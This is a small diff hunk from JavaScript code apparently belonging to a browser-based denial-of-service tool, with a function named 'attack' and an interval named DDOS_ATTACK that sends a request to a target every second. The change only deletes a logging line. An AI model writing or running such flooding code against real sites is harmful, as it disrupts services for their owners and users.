@@ -22,8 +22,6 @@ function attack(
 				x.open(method, target + "?v=" + version, true);
 				x.send(packet);
 			}
-			
-			console.log("Packet sent");
 		}, 1000);
 	}else{
 		clearInterval(DDOS_ATTACK);
